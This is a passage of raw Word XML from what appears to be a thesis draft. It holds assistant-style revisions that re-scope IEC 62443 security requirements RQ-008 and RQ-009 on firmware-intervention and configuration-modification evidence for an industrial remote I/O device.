          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7EE21C78" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:pict w14:anchorId="75BE279E">
          <v:rect id="_x0000_i1547" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="436B26F9" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-008)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C2F035" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed config-modification markers</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M0 REVISION_COUNTER</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M4 signature</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> deleted from RQ-008's evidence surface; they are </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-modification evidence → </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (you flagged this yourself). RQ-008 now covers </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software/firmware-intervention evidence only</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: Error Log FW-events, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SysCom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> UPDATE_*, /firmware/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version+SOFTWARE_REVISION</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> delta, Update-state LED. </w:t>
      </w:r>
      <w:hyperlink r:id="rId210" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0002207B">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId211" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5185DB3F" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Re-framed G-2</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as an </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence-classification</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> failure (the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cannot distinguish legitimate/illegitimate) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-referenced RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the underlying no-signature cause — no re-testing of the protection here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1738F05C" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Bounded G-3</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — kept the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-erasing install</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as RQ-008's decisive evidence finding; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> dimension of the same mechanism is </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-referenced to RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E69AAA5" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Kept the audit family intact</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — CR 2.8/2.9/2.10/2.11/2.12/3.9/6.1 + EDR 2.13; STRIDE = Repudiation + Tampering-on-audit. Consistent with RQ-003. </w:t>
      </w:r>
      <w:hyperlink r:id="rId212" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId213" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[IEC62443_4_2_source | Txt]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="36C4891B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 xml:space="preserve">Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 = collect evidence of software (firmware) intervention</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — readable (CR 6.1) but </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unattributed, un-timestamped, self-erased at install, and unable to classify legitimate vs illegitimate</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — with </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>config-modification evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the no-signature cause</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>update authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCCB2BE" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recheck RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> next (to confirm it correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the REVISION_COUNTER/I&amp;M4 config-modification markers now deferred from RQ-004 and RQ-008), or (b) proceed to </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compile the fully corrected RQ-001 → RQ-014 set into the consolidated thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6052EA57" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D1549EB" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F989F37" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FAE4503" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EFDA383" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38EA05F0" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6750A57A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AEF36C4" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="764435B5" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D354B42" w14:textId="61F95EB5" w:rsidR="008E6DD6" w:rsidRPr="00C1714F" w:rsidRDefault="008E6DD6" w:rsidP="008E6DD6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lastRenderedPageBreak/>
        <w:t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C78467F" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRPr="0077494B" w:rsidRDefault="008E6DD6" w:rsidP="0077494B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D28CACA" w14:textId="1EA4C90F" w:rsidR="004602FD" w:rsidRPr="00C1714F" w:rsidRDefault="004602FD" w:rsidP="004602FD">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="583B334F" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722C5548" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-009 is the requirement that </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the config-modification markers (REVISION_COUNTER, I&amp;M4) I just removed from RQ-004 and RQ-008 — so the recheck is mostly about </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>placing them here and re-scoping the software/firmware overlap with RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D0A777" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Config-modification markers now land here (correct home).</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> REVISION_COUNTER (increments on parameter change) and I&amp;M4 (parameter-set fingerprint) are </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>configuration-modification</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> evidence → they belong to RQ-009. </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This is their correct destination</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, closing the loop from the RQ-004/RQ-008 corrections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B540E5" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Software/firmware-modification overlap with RQ-008 (re-scope).</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-008 = </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>intervention in software</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; RQ-009 = </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">modification of software </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>or its configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. These </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>heavily overlap on the firmware side</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. To avoid duplication, I make </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>configuration modification the primary, unique limb of RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
